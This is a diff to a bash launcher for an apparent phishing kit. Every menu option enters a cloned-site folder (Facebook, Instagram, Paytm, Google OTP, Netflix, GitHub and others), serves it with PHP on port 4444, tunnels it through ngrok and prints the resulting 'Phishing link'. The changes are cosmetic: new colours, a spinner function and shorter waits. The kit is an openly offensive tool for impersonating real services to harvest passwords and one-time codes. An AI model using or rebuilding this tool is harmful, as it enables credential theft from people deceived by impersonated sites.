@@ -46,6 +46,24 @@ else
 exit
 fi
 
+spin () {
+local pid=$!
+local delay=0.05
+local spinstr='|/-\'
+while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
+local temp=${spinstr#?}
+tput civis
+printf "\e[1;31m\r[\e[32m*\e[31m]\e[1;33m Fetching server ...  [\e[1;32m%c\e[1;33m]\e[0m  " "$spinstr"
+local spinstr=$temp${spinstr%"$temp"}
+sleep $delay
+printf "\b\b\b\b\b\b"
+done
+printf "   \b\b\b"
+tput cnorm
+printf "\e[1;32m[Done]\e[0m"
+done
+}
+
 php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
 ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
 kill -9 $php
@@ -126,7 +144,7 @@ ash() {
         echo -e "\e[31m[\e[32m*\e[31m]\e[32m Your phishing url >>\e[m $final "
         }
 
-        read -p $'\e[31m[\e[32m*\e[31m]\e[93m Enter Your Choice : \e[0m' option
+        read -p $'\e[91m[\e[92m*\e[91m]\e[93m Enter Your Choice : \e[0m' option
 	
          if [ $option = 01 ] || [ $option = 1 ]
          then
@@ -134,16 +152,16 @@ ash() {
                             cd facebook/
                             echo 
 			    connection
-			    echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"   
+			    echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"   
 			    php -S 127.0.0.1:4444 > /dev/null 2>&1 &    
 			    sleep 2  
 			    echo ""
-			    echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+			    (sleep 8) &> /dev/null & spin
 			    ./ngrok http 4444 > /dev/null 2>&1 & 
-			    sleep 4
+			    sleep 1
 			    echo ""
 			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
-			    printf "\e[31m[\e[32m*\e[31m]\e[33m Your URL >>\e[0m\e[32m %s\e[0m\n" $link
+			    printf "\e[91m[\e[92m*\e[91m]\e[93m Your URL >>\e[0m\e[92m %s\e[0m\n" $link
 			    echo ""                                                                                                                           
 			    ash 
 			    echo " "
@@ -161,16 +179,16 @@ ash() {
                            cd pinterest/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[32m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
 		           echo " "
@@ -188,16 +206,16 @@ ash() {
 			   cd instagram/
 			   echo 
 			   connection
-			   echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m" 
+			   echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m" 
 			   php -S 127.0.0.1:4444 > /dev/null 2>&1 &  
 			   sleep 2
 			   echo "" 
-			   echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"     
+			   (sleep 8) &> /dev/null & spin     
 			   ./ngrok http 4444 > /dev/null 2>&1 &
-			   sleep 4
+			   sleep 1
 			   echo ""
 			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-			   printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+			   printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 			   echo "" 
 			   ash
 			   echo " "
@@ -215,16 +233,16 @@ ash() {
 			  cd UberEats-Phishing/
 			  echo 
 			  connection
-			  echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+			  echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
 			  php -S 127.0.0.1:4444 > /dev/null 2>&1 & 
 			  sleep 2  
 			  echo "" 
-			  echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m" 
+			  (sleep 8) &> /dev/null & spin
 			  ./ngrok http 4444 > /dev/null 2>&1 &
-			  sleep 4   
+			  sleep 1  
 			  echo " "
 			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
-			  printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link  
+			  printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link  
 			  echo ""  
 			  ash 
 			  echo " "
@@ -242,16 +260,16 @@ ash() {
                           cd ola-otpbypass/
                           echo 
 			  connection
-                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m" 
+                          echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m" 
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 2   
 		          echo ""
-		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"  
+		          (sleep 8) &> /dev/null & spin 
 		          ./ngrok http 4444 > /dev/null 2>&1 &
-		          sleep 4   
+		          sleep 1 
 		          echo " "
 		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  
-		          printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+		          printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 		          echo "" 
 		          ash
 		          echo " "
@@ -269,16 +287,16 @@ ash() {
                           cd google-otp/
                           echo 
 			  connection
-		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"    
+		          echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"    
 		          php -S 127.0.0.1:4444 > /dev/null 2>&1 &
 		          sleep 2
 		          echo ""
-		          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"   
+		          (sleep 8) &> /dev/null & spin 
 		          ./ngrok http 4444 > /dev/null 2>&1 &
-		          sleep 4
+		          sleep 1
 		          echo " "
 		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")        
-		          printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+		          printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
 		          echo "" 
 		          ash
 			  echo " "
@@ -299,22 +317,22 @@ ash() {
 			  echo
                           echo -e "\e[1;31m[\e[0m\e[1;77m 2 \e[0m\e[1;31m]\e[0m\e[1;32m Paytm Sign UP \e[0m"
                           echo 
-                          read -p $'\e[1;31m[\e[0m\e[1;32m >>> \e[0m\e[1;31m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option1
+                          read -p $'\e[1;91m[\e[0m\e[1;92m >>> \e[0m\e[1;91m]\e[0m\e[1;92m Enter Your Choice : \e[0m' option1
 		          if [ $option1 = 1 ] || [ $option1 = 01 ]
 			  then
 			        cd paytm/
                                 echo 
 				connection
-                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 2
                                 echo ""
-                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                                (sleep 8) &> /dev/null & spin
                                 ./ngrok http 4444 > /dev/null 2>&1 &
-                                sleep 4
+                                sleep 1
                                 echo ""
                                 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                                printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                                printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                                 echo ""
 			        ash
 			        echo " "
@@ -329,16 +347,16 @@ ash() {
                                 cd signup/
                                 echo 
 				connection
-                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                                echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                                 php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                                 sleep 2
                                 echo ""
-                                echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                                (sleep 8) &> /dev/null & spin
                                 ./ngrok http 4444 > /dev/null 2>&1 &
-                                sleep 2
+                                sleep 1
                                 echo ""
                                 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                                printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                                printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                                 echo ""
 			        ash
 				echo " "
@@ -358,16 +376,16 @@ ash() {
                           cd Netflix/
                           echo 
 			  connection
-                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                          echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
-                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                          (sleep 8) &> /dev/null & spin
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 4
+                          sleep 1
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                          printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                          printf "\e[91m[\e[92m*\e[91m]\e[33m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                           echo ""
 		          ash
 		          echo " "
@@ -385,16 +403,16 @@ ash() {
                            cd instafollow/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
 		           echo " "
@@ -412,16 +430,16 @@ ash() {
                            cd amazonsign/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo 
 		           ash
 		           echo 
@@ -439,16 +457,16 @@ ash() {
                            cd whatsapp-phishing/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
 		           echo " "
@@ -466,16 +484,16 @@ ash() {
                            cd Linkedin/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[31m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
 		           echo " "
@@ -493,16 +511,16 @@ ash() {
                            cd Hotstar-otp-bypass/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash
 		           echo " "
@@ -520,16 +538,16 @@ ash() {
                            cd spotify/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 		           ash 
 		           echo " "
@@ -547,16 +565,16 @@ ash() {
                            cd github/
                            echo 
 			   connection
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           echo -e "\e[91m[\e[92m*\e[91m]\e[93m Starting Phishinhg Attack \e[0m"
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
+                           printf "\e[91m[\e[92m*\e[91m]\e[93m Your Phishing link :\e[0m\e[92m %s\e[0m\n" $link
                            echo ""
 	                   ash
 		           echo " "
@@ -576,9 +594,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -603,9 +621,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -630,9 +648,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -657,9 +675,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -684,9 +702,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -711,9 +729,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 3
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -738,9 +756,9 @@ ash() {
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
-                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                          (sleep 8) &> /dev/null & spin
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 4
+                          sleep 1
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -765,9 +783,9 @@ ash() {
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 2
                           echo ""
-                          echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                          (sleep 8) &> /dev/null & spin
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 4
+                          sleep 1
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                           printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -792,9 +810,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -819,9 +837,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -846,9 +864,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -873,9 +891,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -900,9 +918,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -927,9 +945,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Starting Phishinhg Attack \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -954,9 +972,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -981,9 +999,9 @@ ash() {
                            php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                            sleep 2
                            echo ""
-                           echo -e "\e[31m[\e[32m*\e[31m]\e[33m Loading server.. \e[0m"
+                           (sleep 8) &> /dev/null & spin
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 4
+                           sleep 1
                            echo ""
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                            printf "\e[31m[\e[32m*\e[31m]\e[33m Your Phishing link :\e[0m\e[32m %s\e[0m\n" $link
@@ -998,14 +1016,8 @@ ash() {
 
                            break;
 			   
-		   elif [ $option = 99 ]
-	           then
-                           echo -e $'\e[32m THANKYOU KEEP SUPPORTING \e[m '
-                           sleep 1
-                           exit
-                           break;
-
                   else 
+		  
 		  echo
 		  echo -e "\e[32m[\e[34m!\e[32m]\e[31m Invalid option Try Again !! \e[m "
 		  sleep 2
